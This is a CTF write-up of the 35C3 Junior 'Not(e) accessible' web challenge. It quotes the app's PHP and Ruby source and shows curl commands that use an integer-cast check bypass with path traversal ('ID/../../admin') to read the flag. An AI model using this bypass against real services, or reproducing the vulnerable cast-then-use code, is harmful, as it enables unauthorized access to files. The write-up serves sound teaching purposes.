# Not(e) accessible
Web

## Description:
> We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that's why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.
> 
> Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable...

## Solution:

The website offers a service where one can enter a note. 

After entering the requested note (e.g. "Test"), the response contains the following information:
```
Your note ID is 8156135140806036359
Your note PW is 0cbc6611f5540bd0809a388dc95a615b
Link to view note: http://35.207.132.47:90/view.php?id=8156135140806036359&pw=0cbc6611f5540bd0809a388dc95a615b
```

Some observations: 
* When entering the same text twice, the ID changes but the PW does not.
* Searching for the PW, it looks like it is the MD5 of the note.
* The website source code has the following comment: `<!-- My source is at /src.tgz -->`

The next step is obviously to try and download the source code, and indeed - such an archive exists.

After extracting it, we get:

```ruby
# File path: backend/app.rb:

require 'sinatra'
set :bind, '0.0.0.0'

get '/get/:id' do
	File.read("./notes/#{params['id']}.note")
end

get '/store/:id/:note' do 
	File.write("./notes/#{params['id']}.note", params['note'])
	puts "OK"
end 

get '/admin' do
	File.read("flag.txt")
end
```

```php
# File path: frontend/index.php
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="/assets/css/bootstrap.min.css">
    <title>Not(e) accessible</title>
<!-- My source is at /src.tgz -->
    <style>
html {
  position: relative;
  min-height: 100%;
}

body {
  padding-top: 5rem;
  margin-bottom: 60px; /* Margin bottom by footer height */
}
.starter-template {
  padding: 3rem 1.5rem;
  text-align: center;
}
.footer {
  position: absolute;
  bottom: 0;
  width: 100%;
  height: 60px; /* Set the fixed height of the footer here */
  line-height: 60px; /* Vertically center the text there */
  background-color: #f5f5f5;
}
    </style>
</head>
    <body>

    <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
      <a class="navbar-brand" href="/">Not(e) accessible</a>
    </nav>

    <main role="main" class="container">

      <div class="starter-template">
        <h1>Not(e) accessible :-(</h1>
        <p class="lead">This is good service. It is not(e) accessible!</p>
      </div>
      <div class="container">
        <form method="post">
              <div class="form-group">
                <label for="note">Enter your text</label>
                <textarea class="form-control" name="note" id="note" placeholder="Your note here!" rows="3"></textarea>
              </div>
              <button type="submit" class="btn btn-primary" name="submit" value="submit">Submit note!</button>
        </form>
      </div>

<?php
    require_once "config.php";

    if(isset($_POST['submit']) && isset($_POST['note']) && $_POST['note']!="") {
        $note = $_POST['note'];

        if(strlen($note) > 1000) {
            die("ERROR! - Text too long");
        }

        if(!preg_match("/^[a-zA-Z]+$/", $note)) {
            die("ERROR! - Text does not match /^[a-zA-Z]+$/");
        }

        $id = random_int(PHP_INT_MIN, PHP_INT_MAX);
        $pw = md5($note);
        
        # Save password so that we can check it later
        file_put_contents("./pws/$id.pw", $pw); 

        file_get_contents($BACKEND . "store/" . $id . "/" . $note);

        echo '<div class="shadow-sm p-3 mb-5 bg-white rounded">';
            echo "<p>Your note ID is $id<br>";
            echo "Your note PW is $pw</p>";

            echo "<a href='/view.php?id=$id&pw=$pw'>Click here to view your note!</a>";
        echo '</div>';
    }
?>
    </main>

<footer class="footer">
      <div class="container">
        <span class="text-muted">With love from <a href="https://twitter.com/gehaxelt">@gehaxelt</a> for the 35C3 Junior CTF and ESPR :-)</span>
      </div>
</footer>


        <script src="/assets/js/jquery-3.3.1.slim.min.js"></script>
        <script src="/assets/js/popper.min.js"></script>
        <script src="/assets/js/bootstrap.min.js"></script>
    </body>
</html>
```

```php
# File path: frontend/view.php:
<?php header("Content-Type: text/plain"); ?>
<?php 
    require_once "config.php";
    if(isset($_GET['id']) && isset($_GET['pw'])) {
        $id = $_GET['id'];
        if(file_exists("./pws/" . (int) $id . ".pw")) {
            if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
                echo file_get_contents($BACKEND . "get/" . $id);
            } else {
                die("ERROR!");
            }
        } else {
            die("ERROR!");
        }
    }
?>
```

The backend catches the immediate attention due to the following logic:
```ruby
get '/admin' do
	File.read("flag.txt")
end
```

So, we need to find a way to either access `/admin` or directly access `flag.txt`.

Back to `view.php`:
```php
if(file_exists("./pws/" . (int) $id . ".pw")) {
    if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
        echo file_get_contents($BACKEND . "get/" . $id);
    }
    ...
}
```

The `file_get_contents` call looks like it is vulnerable to path traversal - if we get it to be `../admin` then we should get the flag. However, how to we bypass the checks above? Easy - with the help of the type casting! 

Since `$id` is cast to an integer, if we send a string which starts with a number, the PHP engine will ignore anything that comes after it. So we just need a valid ID-PW pair, and we send the ID as `<ID>/../../admin`. The first two checks should pass since they will only take into account the ID, and the third line will actually tread the ID as a folder.

```console
root@kali:/media/sf_CTFs/35c3ctf/Note_accessible# curl -s 'http://35.207.132.47:90/' -H 'Content-Type: application/x-www-form-urlencoded'  --data 'note=Test&submit=submit' | grep "Your note ID"
<div class="shadow-sm p-3 mb-5 bg-white rounded"><p>Your note ID is 140357144873505230<br>Your note PW is 0cbc6611f5540bd0809a388dc95a615b</p><a href='/view.php?id=140357144873505230&pw=0cbc6611f5540bd0809a388dc95a615b'>Click here to view your note!</a></div>    </main>
root@kali:/media/sf_CTFs/35c3ctf/Note_accessible# curl -s 'http://35.207.132.47:90/view.php?pw=0cbc6611f5540bd0809a388dc95a615b&id=140357144873505230/../../admin'
35C3_M1Cr0_S3rvices_4R3_FUN!
```

The flag: 35C3_M1Cr0_S3rvices_4R3_FUN!


